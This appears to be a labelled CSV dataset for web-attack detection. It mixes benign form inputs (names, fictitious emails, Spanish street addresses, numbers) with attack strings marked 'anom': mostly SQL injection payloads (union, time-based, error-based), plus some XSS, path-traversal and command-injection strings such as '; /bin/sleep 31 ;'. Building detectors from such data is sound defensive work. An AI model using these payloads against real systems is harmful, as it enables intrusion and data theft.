payload,length,attack_type,label
47628834c,9,norm,norm
9009008887787551,16,norm,norm
"1%"" order by 1--",16,sqli,anom
"1"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",96,sqli,anom
"1"") where 4660=4660 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,sqli,anom
debrocar,8,norm,norm
8323552403219603,16,norm,norm
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')-- izad,102,sqli,anom
9751,4,norm,norm
17403,5,norm,norm
"1"" where 2452=2452;select sleep(5)#",35,sqli,anom
"1%"" and 2388=benchmark(5000000,md5(0x6d457153))#",48,sqli,anom
"calle doctor zamenhoff, 107",27,norm,norm
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",65,sqli,anom
seglar,6,norm,norm
"1%' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and '%'='",115,sqli,anom
mccauley@autobuses-hibridos.ph,30,norm,norm
ag-uzadura,10,norm,norm
1);select (case when (3626=6022) then 3626 else cast(1 as int)/(select 0 from dual) end) from dual--,100,sqli,anom
17115248m,9,norm,norm
"1""))) union all select null--",29,sqli,anom
nicova8@necesitocurro.kg,24,norm,norm
-2929'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('nzmk'='nzmk,122,sqli,anom
chueca,6,norm,norm
-5764 or 3038=3038,18,sqli,anom
"-5630"") or 3038=3038",20,sqli,anom
bonete,6,norm,norm
"1%"") and elt(3114=3114,sleep(5))#",33,sqli,anom
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('thce'='thce",123,sqli,anom
desligar,8,norm,norm
cabanelles,10,norm,norm
"calle abeto, 187,",17,norm,norm
maisonne,8,norm,norm
in977ili903,11,norm,norm
caamao alayo,12,norm,norm
1%')));waitfor delay '0:0:5' and ((('%'=',41,sqli,anom
"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">",112,xss,anom
46128,5,norm,norm
norstar,7,norm,norm
aparencia,9,norm,norm
4o4d3nero,9,norm,norm
sheng-passanante@ankawaelda.int,31,norm,norm
"1' where 8729=8729;select benchmark(5000000,md5(0x714e4153))#",61,sqli,anom
"c/ marcos de torniello, 67 9?d",30,norm,norm
3428501234979373,16,norm,norm
"1"")) or (select * from (select(sleep(5)))sddo)#",47,sqli,anom
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)# usus",97,sqli,anom
23599996h,9,norm,norm
tapinga,7,norm,norm
1'||(select 'goen' from dual where 8586=8586;select (case when (2132=8969) then 1 else 2132*(select 2132 from master..sysdatabases) end)--,138,sqli,anom
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('iifh'='iifh",112,sqli,anom
"1"") as qmtx where 5280=5280 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",179,sqli,anom
id,2,cmdi,anom
waldon,6,norm,norm
"-9944"")) or 8537=2039 and ((""kfzj""=""kfzj",40,sqli,anom
33245427p,9,norm,norm
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",107,sqli,anom
"1'||(select 'fcws' from dual where 9184=9184 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'",140,sqli,anom
cehegn,6,norm,norm
8121,4,norm,norm
rev2elaci3,10,norm,norm
nadav6,6,norm,norm
43376,5,norm,norm
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- xwoo,240,sqli,anom
bodo,4,norm,norm
onomstico,9,norm,norm
"paratge barnades, 43",20,norm,norm
1)) as jvoo where 5116=5116 or 4240=(select 4240 from pg_sleep(5))--,68,sqli,anom
comerate.foldi@ofertaschinas.dm,31,norm,norm
delvische@softstylestudio.ly,28,norm,norm
"1%')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",143,sqli,anom
82474321r,9,norm,norm
fulmnica,8,norm,norm
96527161w,9,norm,norm
kwasniewska.tamburi@testdevelcidad.cr,37,norm,norm
51620770f,9,norm,norm
byoungin,8,norm,norm
7841490490898807,16,norm,norm
atractivo,9,norm,norm
"c/ ortiz de zuiga, 8,",21,norm,norm
"1';select count(*) from generate_series(1,5000000)--",52,sqli,anom
15552,5,norm,norm
1%';select (case when (9490=6134) then 9490 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli,anom
"1) as dqda where 1624=1624 and 8635=(select count(*) from generate_series(1,5000000))--",87,sqli,anom
camita,6,norm,norm
1'+(select 'dkxk' where 1241=1241 waitfor delay '0:0:5'--,57,sqli,anom
erich,5,norm,norm
perl,4,norm,norm
"c/ montaer ruiz, 24, 12a",24,norm,norm
2420,4,norm,norm
"avenida rafael cabrera, 24, 8?g",31,norm,norm
42773884w,9,norm,norm
"1"")) as bbkl where 5686=5686;select benchmark(5000000,md5(0x4c4d6142))--",72,sqli,anom
plaa del pi verd 84 10b,23,norm,norm
"-6854"" where 7794=7794 union all select 7794,7794--",51,sqli,anom
dorra,5,norm,norm
45479,5,norm,norm
quek,4,norm,norm
8911,4,norm,norm
4476727258540536,16,norm,norm
"1') as ssxj where 3845=3845 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",103,sqli,anom
1')));waitfor delay '0:0:5' and ((('hrta'='hrta,47,sqli,anom
segura reygadas,15,norm,norm
falbee0,7,norm,norm
alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,69,xss,anom
"1"");select pg_sleep(5) and (""tpry""=""tpry",40,sqli,anom
gino,4,norm,norm
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('bwka'='bwka,119,sqli,anom
11640,5,norm,norm
didani,6,norm,norm
"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>",69,xss,anom
jole,4,norm,norm
"calle hostieros, 24",19,norm,norm
"1%')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",68,sqli,anom
"1';iif(5257=5257,1,1/0)",23,sqli,anom
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""fuus"" like ""fuus",231,sqli,anom
"1'||(select 'oyyu' where 6765=6765 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'",129,sqli,anom
2ariosamente,12,norm,norm
lema cuartero,13,norm,norm
3813,4,norm,norm
"1') as ibqr where 5372=5372 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",103,sqli,anom
"1%' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and '%'='",116,sqli,anom
"1) as agex where 8167=8167 and 3824=benchmark(5000000,md5(0x76555642))--",72,sqli,anom
bunn,4,norm,norm
"1"")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",100,sqli,anom
"1'+(select acax where 4169=4169 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",130,sqli,anom
bylina,6,norm,norm
rocheman@sindns.er,18,norm,norm
"-8609' union all select 9384,9384,9384,9384--",45,sqli,anom
valderredible,13,norm,norm
bova@atorre.cc,14,norm,norm
1)) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((4279=4279,79,sqli,anom
co8descender,12,norm,norm
carrer sant joan de deu 186,27,norm,norm
"1'+(select 'opqr' where 2442=2442 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",131,sqli,anom
"1"")) as dooq where 7911=7911;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",116,sqli,anom
mikel,5,norm,norm
running,7,norm,norm
shumsky.zalata5@telelujo.ci,27,norm,norm
nehemiah,8,norm,norm
ozer,4,norm,norm
6074,4,norm,norm
shiner-rangda@guerrerodelbienestar.cr,37,norm,norm
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""cuzi"" like ""cuzi",123,sqli,anom
"1"") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,sqli,anom
"calle morse, 17",15,norm,norm
5176,4,norm,norm
pierre,6,norm,norm
"-5143'+(select 'zyrr' where 8405=8405 union all select 8405,8405,8405,8405#",75,sqli,anom
scheff_guiffre@interpretacion-diccionario-y-significado-de-los-s,64,norm,norm
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('dbsm'='dbsm",99,sqli,anom
"1)) as oqfr where 6426=6426 and make_set(8403=8403,8899)--",58,sqli,anom
82332840q,9,norm,norm
rube,4,norm,norm
0383494662597592,16,norm,norm
-8447 where 2850=2850 or 7147=3262,34,sqli,anom
"calle capita farre, 82, 8-d",27,norm,norm
6435,4,norm,norm
1) and 2457=8146,16,sqli,anom
"-7060') or make_set(4233=1689,1689) and ('twpr' like 'twpr",58,sqli,anom
"1"" and 6637=2321",16,sqli,anom
cer97708or7,11,norm,norm
4ip7237o8h2dira,15,norm,norm
46460133h,9,norm,norm
1)));select (case when (8331=5625) then 8331 else 8331*(select 8331 from mysql.db) end)#,88,sqli,anom
1'+(select zwsr where 6567=6567;select pg_sleep(5))+',53,sqli,anom
calle mont-ral 59 12?g,22,norm,norm
politi arandojo,15,norm,norm
-4617'))) or 9323=9323#,23,sqli,anom
"colmenares, 74,",15,norm,norm
"-5845'))) union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",72,sqli,anom
holgachona,10,norm,norm
"1%"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",200,sqli,anom
-1190' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'yxry' like 'yxry,259,sqli,anom
faisana,7,norm,norm
murillo de ro leza,18,norm,norm
75010741j,9,norm,norm
zilzer@foreignoffice.fo,23,norm,norm
"1"") as ffon where 2738=2738 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",261,sqli,anom
"1%"" or (select * from (select(sleep(5)))ydpu) and ""%""=""",55,sqli,anom
"calle antigua calle de la mar, 31, 7?d",38,norm,norm
"1)) as ehlg where 6340=6340;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",112,sqli,anom
3128013884204713,16,norm,norm
daly@diagnosticoradiologico.jm,30,norm,norm
cruttenden@saludyfitness.ca,27,norm,norm
polesello@tantomontamontatanto.int,34,norm,norm
"1"") where 9648=9648 and elt(1210=1210,sleep(5))--",49,sqli,anom
gramajo,7,norm,norm
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",95,sqli,anom
1433,4,norm,norm
galdano,7,norm,norm
"-5802'))) union all select 6286,6286,6286,6286#",47,sqli,anom
"1%') union all select null,null,null,null,null,null,null,null#",62,sqli,anom
"1"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",101,sqli,anom
revivificacin,13,norm,norm
"1%' union all select null,null,null,null,null,null,null--",57,sqli,anom
killan@923.fr,13,norm,norm
6733674859620328,16,norm,norm
maeya,5,norm,norm
celso,5,norm,norm
"calle sagristans, 132,",22,norm,norm
"1) where 2543=2543;iif(2205=4764,1,1/0)",39,sqli,anom
bill,4,norm,norm
veguos@schnapps.com.mn,22,norm,norm
groen@civicosdns.na,19,norm,norm
4u9_l5o,7,norm,norm
"llobregat 130,",14,norm,norm
"1"") where 1330=1330 or (select * from (select(sleep(5)))ydpu)--",63,sqli,anom
"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",60,sqli,anom
1165,4,norm,norm
-9355' or (8459=8459)*4906 and 'aegf'='aegf,43,sqli,anom
-1252') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('pzxh' like 'pzxh,232,sqli,anom
"1) as lisg where 5490=5490;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",143,sqli,anom
gorin.mccracken@evelin.am,25,norm,norm
seema@ajedrezconmaestros.ne,27,norm,norm
cimoteo,7,norm,norm
"1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",215,sqli,anom
c35iz3,6,norm,norm
8750399717203336,16,norm,norm
17333,5,norm,norm
18vi5i9ad,9,norm,norm
horatio,7,norm,norm
4016,4,norm,norm
karn,4,norm,norm
rojo,4,norm,norm
"-9553"") as geih where 6453=6453 or 8453=8159--",46,sqli,anom
"<br size=""&{document.cookie=true}"">",35,xss,anom
martinsan.broughton@etxarriaranatz.ck,37,norm,norm
-7901) order by 1--,19,sqli,anom
1));select case when 8237=9948 then 1 else null end--,53,sqli,anom
fuchs.keres@cpanelweb.tel,25,norm,norm
salillas de jaln,16,norm,norm
buch als,8,norm,norm
basilisa,8,norm,norm
"1) where 1270=1270 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",190,sqli,anom
"<script>document.write(""<scri"");</script>pt src=""http://vulnerability-lab.com/crosssitescripting.js""></script>",110,xss,anom
"1' union all select null,null,null,null#",40,sqli,anom
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- rucf",107,sqli,anom
"-8021"") union all select 1166,1166,1166,1166--",46,sqli,anom
814ic4li4a,10,norm,norm
35807418y,9,norm,norm
36726019x,9,norm,norm
1'));waitfor delay '0:0:5' and (('yjsp' like 'yjsp,50,sqli,anom
ferreras de arriba,18,norm,norm
cambil,6,norm,norm
"1%"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli,anom
c.0c4r1,7,norm,norm
levac,5,norm,norm
96685723w,9,norm,norm
32845189q,9,norm,norm
"-7395%"" order by 1--",20,sqli,anom
budd9,5,norm,norm
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('uwbh'='uwbh",171,sqli,anom
galligan@bijoubijoudiferente.vg,31,norm,norm
1) where 5866=5866 and 4595=4595#,33,sqli,anom
c/ 1 sur s/n 12?g,17,norm,norm
karolefs,8,norm,norm
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# cdjm",106,sqli,anom
1'+(select 'iify' where 6257=6257 or 6793=(select 6793 from pg_sleep(5)))+',75,sqli,anom
"-2007' where 9157=9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",85,sqli,anom
fitzgera,8,norm,norm
"romero de torres, 147 9e",24,norm,norm
"1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli,anom
weddle@teamspanish.bz,21,norm,norm
">""<div style=""width: expression(document.cookie=true;);"">",57,xss,anom
"c/ padre francisco s/n,",23,norm,norm
6913071576619939,16,norm,norm
comber@barnicesultravioleta.kz,30,norm,norm
portomarn,9,norm,norm
"-5372"") as wlqm where 2432=2432 union all select 2432,2432,2432,2432,2432,2432#",79,sqli,anom
71542361x,9,norm,norm
1'))) waitfor delay '0:0:5' and ((('clcf'='clcf,47,sqli,anom
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz",74,sqli,anom
ilana,5,norm,norm
schadan,7,norm,norm
12427,5,norm,norm
"-3955%')) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",72,sqli,anom
de cabezn raizbal,17,norm,norm
ambros,6,norm,norm
"isabelita ruiz, 31",18,norm,norm
perseidas,9,norm,norm
6959239796912888,16,norm,norm
"1')) as fbjd where 8597=8597;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",129,sqli,anom
"1"")));select * from generate_series(9058,9058,case when (9058=1183) then 1 else 0 end) limit 1--",96,sqli,anom
"1%"" and elt(5345=8751,8751) and ""%""=""",37,sqli,anom
metclafe4@cursosdele.az,23,norm,norm
27388,5,norm,norm
ranganad,8,norm,norm
"1';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",70,sqli,anom
10263,5,norm,norm
""",,,,,x"" onerror=""alert(1)"">",28,xss,anom
"c/ jose belso castao, s/n,",26,norm,norm
26295439e,9,norm,norm
teulinks-oakman@941.tr,22,norm,norm
"glorieta mineros, 3,",20,norm,norm
crosswel,8,norm,norm
"santisima cruz, 123 10?b",24,norm,norm
99020664y,9,norm,norm
1) as hlcn where 1165=1165 rlike (select * from (select(sleep(5)))vwyq)#,72,sqli,anom
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('guxv'='guxv,210,sqli,anom
"-5313') union all select 7187,7187,7187#",40,sqli,anom
18449,5,norm,norm
earline,7,norm,norm
almera,6,norm,norm
34259,5,norm,norm
retejador,9,norm,norm
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (9841=9841",168,sqli,anom
delusiva,8,norm,norm
"sierra del gudar 98,",20,norm,norm
"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",88,sqli,anom
1%' and 1736=4220,17,sqli,anom
37541,5,norm,norm
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",85,sqli,anom
"1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--",56,sqli,anom
"1%"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""%""=""",79,sqli,anom
juan,4,norm,norm
7509082311963954,16,norm,norm
torreblanca pujades,19,norm,norm
sogorb ipamo,12,norm,norm
"-6656"") union all select 3931#",30,sqli,anom
dasya4,6,norm,norm
"<style type=""text/javascript"">document.cookie=true;</style>",59,xss,anom
"-3827"") or 8571=8571--",22,sqli,anom
12001090n,9,norm,norm
1%'))) and 1661=7683,20,sqli,anom
7,1,norm,norm
fortes@corjet.au,16,norm,norm
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",46,sqli,anom
paracuellos,11,norm,norm
"pl. sierra de ayllon 100,",25,norm,norm
"1) and make_set(8403=8403,8899)",31,sqli,anom
ferreira5,9,norm,norm
wardle,6,norm,norm
a73p3i4,7,norm,norm
corcoll duhalde,15,norm,norm
1 where 9361=9361 and 7478=9170--,33,sqli,anom
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",76,sqli,anom
hau,3,norm,norm
2651730269519486,16,norm,norm
"1%' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",79,sqli,anom
"1'||(select 'aoad' where 8795=8795 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",177,sqli,anom
-1602' or 3038=3038,19,sqli,anom
sobrecogimiento,15,norm,norm
/..//..//..//..//{file},23,path-traversal,anom
/..0x2f..0x2f..0x2f{file},25,path-traversal,anom
de las muecas pedrol,20,norm,norm
winifred5,9,norm,norm
benedit ferrandi,16,norm,norm
nicolett,8,norm,norm
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""eiuc"" like ""eiuc",114,sqli,anom
crdoba,6,norm,norm
"1""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""rtzn""=""rtzn",99,sqli,anom
preordinar,10,norm,norm
bears,5,norm,norm
9947210285103354,16,norm,norm
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",94,sqli,anom
9129,4,norm,norm
sot143a82,9,norm,norm
"1%'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='",215,sqli,anom
"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((5432=5432",107,sqli,anom
1) as duqb where 6495=6495;select (case when (5914=2314) then 5914 else 1/(select 0) end)--,91,sqli,anom
"1' where 3028=3028;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",103,sqli,anom
60106679c,9,norm,norm
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",120,sqli,anom
"1%"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",165,sqli,anom
1'||(select 'zzkx' where 3270=3270 and 2006=2006,48,sqli,anom
ajona valenzuela,16,norm,norm
sweldund-pasetti@supercover.lt,30,norm,norm
2925,4,norm,norm
mir9136,7,norm,norm
aguaviento,10,norm,norm
"-3581'||(select 'uxmh' from dual where 8954=8954 union all select 8954,8954,8954,8954,8954,8954#",96,sqli,anom
19185,5,norm,norm
21840329n,9,norm,norm
castillejo de iniesta,21,norm,norm
42223,5,norm,norm
1%'))) rlike (select (case when (7697=3334) then 1 else 0x28 end)) and ((('%'=',79,sqli,anom
mucheng,7,norm,norm
varia,5,norm,norm
6572,4,norm,norm
13591,5,norm,norm
16630,5,norm,norm
"<script>alert(""crosssitescripting"")</script>"";' >",49,xss,anom
/./.././.././.././.././../{file},32,path-traversal,anom
ramesh,6,norm,norm
chao,4,norm,norm
"1'||(select 'dyuw' from dual where 2037=2037;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",145,sqli,anom
01218498g,9,norm,norm
3946406903398216,16,norm,norm
"1%') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",211,sqli,anom
/..../..../..../..../{file},27,path-traversal,anom
ingrid,6,norm,norm
"1'+(select 'zohk' where 5502=5502 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",140,sqli,anom
"1"")));select sleep(5) and (((""wucy"" like ""wucy",46,sqli,anom
ti7o,4,norm,norm
galina,6,norm,norm
2564,4,norm,norm
osmn,4,norm,norm
5303,4,norm,norm
wahlberg8@am-si.np,18,norm,norm
1) where 3381=3381 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,252,sqli,anom
torrija,7,norm,norm
armes@muchacha.com.lr,21,norm,norm
0293148493278191,16,norm,norm
"c/ san lorenzo, 171",19,norm,norm
"calle reina violante, 35,",25,norm,norm
; /bin/sleep 31 ;,17,cmdi,anom
0iri1a33,8,norm,norm
-3166'||(select 'mtan' from dual where 9420=9420 union all select 9420#,71,sqli,anom
noguerol,8,norm,norm
cinthia,7,norm,norm
"1"") as xioc where 7260=7260 or elt(5873=5873,sleep(5))#",55,sqli,anom
andjar,6,norm,norm
1')) and 6690=3250#,19,sqli,anom
robledollano,12,norm,norm
4241,4,norm,norm
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,58,sqli,anom
ricardo,7,norm,norm
steele-kripilani@vendomiatico.se,32,norm,norm
1' rlike (select * from (select(sleep(5)))vwyq)#,48,sqli,anom
iara,4,norm,norm
"carrer mestre albages 61,",25,norm,norm
48714518n,9,norm,norm
"-5109))) or make_set(6627=7331,7331) and (((9466=9466",53,sqli,anom
52,2,norm,norm
5828720454408977,16,norm,norm
thala,5,norm,norm
desequilibrar,13,norm,norm
valdelosa,9,norm,norm
"-2518' union all select 6818,6818,6818,6818,6818,6818#",54,sqli,anom
maurilio,8,norm,norm
sheree,6,norm,norm
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",109,sqli,anom
"castillo de segura de leon, 56, 10?c",36,norm,norm
1) and 7533=7533,16,sqli,anom
1738,4,norm,norm
9457153149790079,16,norm,norm
"-1451%') union all select 7666,7666,7666#",41,sqli,anom
78370849m,9,norm,norm
ro3eral,7,norm,norm
"1))) union all select null,null,null,null#",42,sqli,anom
3729462689240161,16,norm,norm
e0l4i1,6,norm,norm
b3zucar,7,norm,norm
fornea,6,norm,norm
43895,5,norm,norm
"1))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",48,sqli,anom
"iif(3204=8489,3204,1/0)",23,sqli,anom
"1"") as xsgx where 5239=5239 union all select null,null--",56,sqli,anom
9786890057742572,16,norm,norm
"1' in boolean mode) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",120,sqli,anom
millot_power@guejos.sv,22,norm,norm
"1"") as ymto where 3453=3453;select benchmark(5000000,md5(0x4c4d6142))--",71,sqli,anom
cardona,7,norm,norm
lizzi,5,norm,norm
i_nsania,8,norm,norm
"1"")) as tfjh where 1134=1134 and 8635=(select count(*) from generate_series(1,5000000))--",89,sqli,anom
"1')) or elt(6272=6272,sleep(5)) and (('zjel' like 'zjel",55,sqli,anom
1) where 4653=4653 or 6793=(select 6793 from pg_sleep(5))--,59,sqli,anom
3609841962548925,16,norm,norm
segovia,7,norm,norm
chavez,6,norm,norm
ceajo,5,norm,norm
"1%""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""%""=""",121,sqli,anom
